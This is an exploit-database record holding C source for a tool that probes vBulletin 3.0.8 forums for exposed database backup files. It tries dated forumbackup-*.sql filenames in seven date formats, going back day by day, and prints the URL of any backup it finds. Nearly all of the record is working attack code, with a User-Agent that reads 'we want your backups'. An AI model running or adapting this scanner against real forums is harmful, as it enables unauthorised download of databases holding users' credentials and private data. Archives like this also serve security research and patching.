{
  "id": "1189",
  "title": "vBulletin 3.0.8 - Accessible Database Backup Searcher (3)",
  "cve": null,
  "vuln_type": "unknown",
  "code": "/*\r\n * Needed to pentest a few vBulletin forums so I wrote this junk real quick.\r\n * Reference: http://securitytracker.com/alerts/2005/Aug/1014805.html\r\n * Good paths: /forum/ / /forum/archive/ /forum/cpadmin/\r\n * Update 1: Code error fixes. /str0ke (str0ke@milw0rm.com)\r\n * Update 2: Fixed datestring-version for international boards by hals1 (h4ls4bschn31d3r@gmx.net)\r\n * Update 3: French vBulletin boards added by Tyn0r (tyn0r@atxteam.net)\r\n * /str0ke\r\n */\r\n\r\n#include <sys/types.h>\r\n#include <sys/socket.h>\r\n#include <netinet/in.h>\r\n#include <arpa/inet.h>\r\n#include <netdb.h>\r\n#include <stdio.h>\r\n#include <unistd.h>\r\n\r\n#define SERVER_PORT 80\r\n\r\nchar *getdate(int b){\r\n\tstatic char datestring[40];\r\n\ttime_t ttt;\r\n        int minustime;\r\n\tminustime=86400 * b;\r\n\tttt=time(NULL)- minustime;\r\n\tstrftime (datestring, sizeof(datestring), \"%m-%d-%Y\", localtime(&ttt));\r\n\tprintf(\"Searching: forumbackup-%s.sql\\n\", datestring);\r\n\treturn(datestring);\r\n}\r\n\r\nchar *getdate2(int b){\r\n        static char datestring[40];\r\n        time_t ttt;\r\n        int minustime;\r\n        minustime=86400 * b;\r\n        ttt=time(NULL)- minustime;\r\n        strftime (datestring, sizeof(datestring), \"%Y-%d-%m\", localtime(&ttt));\r\n        printf(\"Searching: forumbackup-%s.sql\\n\", datestring);\r\n        return(datestring);\r\n}\r\n\r\nchar *getdate3(int b){\r\n        static char datestring[40];\r\n        time_t ttt;\r\n        int minustime;\r\n        minustime=86400 * b;\r\n        ttt=time(NULL)- minustime;\r\n        strftime (datestring, sizeof(datestring), \"%d-%m-%Y\", localtime(&ttt));\r\n        printf(\"Searching: forumbackup-%s.sql\\n\", datestring);\r\n        return(datestring);\r\n}\r\n\r\nchar *getdate4(int b){\r\n\tstatic char datestring[40];\r\n\ttime_t ttt;\r\n        int minustime;\r\n\tminustime=86400 * b;\r\n\tttt=time(NULL)- minustime;\r\n\tstrftime (datestring, sizeof(datestring), \"%m.%d.%Y\", localtime(&ttt)); // hals1\r\n\tprintf(\"Searching: forumbackup-%s.sql\\n\", datestring);\r\n\treturn(datestring);\r\n}\r\n\r\nchar *getdate5(int b){\r\n        static char datestring[40];\r\n        time_t ttt;\r\n        int minustime;\r\n        minustime=86400 * b;\r\n        ttt=time(NULL)- minustime;\r\n        strftime (datestring, sizeof(datestring), \"%Y.%d.%m\", localtime(&ttt)); // hals1\r\n        printf(\"Searching: forumbackup-%s.sql\\n\", datestring);\r\n        return(datestring);\r\n}\r\n\r\nchar *getdate6(int b){\r\n        static char datestring[40];\r\n        time_t ttt;\r\n        int minustime;\r\n        minustime=86400 * b;\r\n        ttt=time(NULL)- minustime;\r\n        strftime (datestring, sizeof(datestring), \"%d.%m.%Y\", localtime(&ttt)); // hals1\r\n        printf(\"Searching: forumbackup-%s.sql\\n\", datestring);\r\n        return(datestring);\r\n}\r\n\r\nchar *getdate7(int b){\r\n        static char datestring[40];\r\n        time_t ttt;\r\n        int minustime;\r\n        minustime=86400 * b;\r\n        ttt=time(NULL)- minustime;\r\n        strftime (datestring, sizeof(datestring), \"%d%m%Y\", localtime(&ttt)); // Tyn0r\r\n        printf(\"Searching: forumbackup-%s.sql\\n\", datestring);\r\n        return(datestring);\r\n}\r\n\r\nmain(int argc, char *argv[]) {\r\n\r\n char buffer[1000],host[255],path[255],dog[255],c;\r\n int sd, rc, i=0, d=0, b;\r\n struct sockaddr_in localAddr, servAddr;\r\n struct hostent *h;\r\n\r\nchar *http =\r\n         \"Accept: */*\\r\\n\"\r\n         \"Accept-Language: en-us,en;q=0.5\\r\\n\"\r\n         \"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\\r\\n\"\r\n         \"User-Agent: we want your backups - milw0rm\\r\\n\"\r\n         \"Connection: close\\r\\n\\r\\n\";\r\n\r\nif ( argc != 5) {\r\n\t        printf(\"vBulletin <= 3.0.8 Accessible Database Backup Searcher /str0ke ! milw0rm.com\\n\");\r\n\t        printf(\"usage: %s -h hostname/ip -p /path/ \\n\",argv[0]);\r\n\t        exit(0);\r\n}\r\n\r\n\r\n while ((c = getopt (argc, argv, \"h:p:\")) != EOF)\r\n       switch(c)\r\n       {\r\n               case 'h':\r\n                       strncpy(host,optarg,sizeof(host));\r\n                       break;\r\n               case 'p':\r\n                       strncpy(path,optarg,sizeof(path));\r\n                       break;\r\n       }\r\n\r\n h = gethostbyname(host);\r\n \r\n if(h==NULL) {\r\n   printf(\"Unknown Host '%s'\\n\",host);\r\n   exit(1);\r\n }\r\n\r\n printf(\"Trying To Connect To [%s]\\n\",host);\r\n while(1){\r\n servAddr.sin_family = h->h_addrtype;\r\n memcpy((char *) &servAddr.sin_addr.s_addr, h->h_addr_list[0], h->h_length);\r\n servAddr.sin_port = htons(SERVER_PORT);\r\n sd = socket(AF_INET, SOCK_STREAM, 0);\r\n \r\n if(sd<0) {\r\n   perror(\"Can Not Open The Socket\\n\");\r\n   exit(1);\r\n }\r\n\r\n localAddr.sin_family = AF_INET;\r\n localAddr.sin_addr.s_addr = htonl(INADDR_ANY);\r\n localAddr.sin_port = htons(0);\r\n\r\n rc = bind(sd, (struct sockaddr *) &localAddr, sizeof(localAddr));\r\n \r\n if(rc<0) {\r\n   printf(\"%d: cannot bind port TCP %u\\n\",sd,SERVER_PORT);\r\n   perror(\"error \");\r\n   exit(1);\r\n }\r\n\r\n rc = connect(sd, (struct sockaddr *) &servAddr, sizeof(servAddr));\r\n\r\n if(rc<0) {\r\n   perror(\"cannot connect\\n\");\r\n   exit(1);\r\n }\r\n   memset(buffer,0,sizeof(buffer));\r\n\r\n   if ( d == 0 ) {\r\n   snprintf(buffer,sizeof(buffer), \"HEAD %s/forumbackup-%s.sql HTTP/1.1\\r\\nHost: %s\\r\\n%s\",path,getdate(i),host,http);\r\n   } else if ( d == 1 ) {\r\n   snprintf(buffer,sizeof(buffer), \"HEAD %s/forumbackup-%s.sql HTTP/1.1\\r\\nHost: %s\\r\\n%s\",path,getdate2(i),host,http);\r\n   } else if ( d == 2 ) {\r\n   snprintf(buffer,sizeof(buffer), \"HEAD %s/forumbackup-%s.sql HTTP/1.1\\r\\nHost: %s\\r\\n%s\",path,getdate3(i),host,http);\r\n   } else if ( d == 3 ) {\r\n   snprintf(buffer,sizeof(buffer), \"HEAD %s/forumbackup-%s.sql HTTP/1.1\\r\\nHost: %s\\r\\n%s\",path,getdate4(i),host,http);\r\n   } else if ( d == 4 ) {\r\n   snprintf(buffer,sizeof(buffer), \"HEAD %s/forumbackup-%s.sql HTTP/1.1\\r\\nHost: %s\\r\\n%s\",path,getdate5(i),host,http);\r\n   } else if ( d == 5 ) {\r\n   snprintf(buffer,sizeof(buffer), \"HEAD %s/forumbackup-%s.sql HTTP/1.1\\r\\nHost: %s\\r\\n%s\",path,getdate6(i),host,http);\r\n   } else if ( d == 6 ) {\r\n   snprintf(buffer,sizeof(buffer), \"HEAD %s/forumbackup-%s.sql HTTP/1.1\\r\\nHost: %s\\r\\n%s\",path,getdate7(i),host,http);\r\n   }\r\n\r\n   rc = send(sd,buffer, strlen(buffer), 0);\r\n   memset(buffer,0,sizeof(buffer));\r\n\r\nwhile(1)\r\n       {\r\n       rc=recv(sd,buffer,sizeof(buffer),0);\r\n       if(strstr(buffer,\"404\")) break;\r\n       if(strstr(buffer,\"200 OK\"))\r\n               {\r\n\t       if ( d == 0 ) {\r\n               printf(\"Database backup found: %s%sforumbackup-%s.sql\\n\", host, path, getdate(i));\r\n\t       }\r\n\t       if ( d == 1 ) {\r\n               printf(\"Database backup found: %s%sforumbackup-%s.sql\\n\", host, path, getdate2(i));\r\n\t       }\r\n\t       if ( d == 2 ) {\r\n               printf(\"Database backup found: %s%sforumbackup-%s.sql\\n\", host, path, getdate3(i));\r\n\t       }\r\n\t       if ( d == 3 ) {\r\n\t       printf(\"Database backup found: %s%sforumbackup-%s.sql\\n\", host, path, getdate4(i));\r\n\t       }\r\n\t       if ( d == 4 ) {\r\n\t       printf(\"Database backup found: %s%sforumbackup-%s.sql\\n\", host, path, getdate5(i));\r\n\t       }\r\n\t       if ( d == 5 ) {\r\n\t       printf(\"Database backup found: %s%sforumbackup-%s.sql\\n\", host, path, getdate6(i));\r\n\t       }\r\n\t       if ( d == 6 ) {\r\n\t       printf(\"Database backup found: %s%sforumbackup-%s.sql\\n\", host, path, getdate7(i));\r\n\t       }\r\n               exit(0);\r\n               }\r\n       memset(buffer,0,sizeof(buffer));\r\n       }\r\nclose(sd);\r\n\r\nif ( d < 6 ) {\r\n\td++;\r\n} else {\r\n\td=0;\r\n        i++;\r\n}\r\n}\r\n}\r\n\r\n// milw0rm.com [2005-08-31]",
  "url": "https://www.exploit-db.com/exploits/1189"
}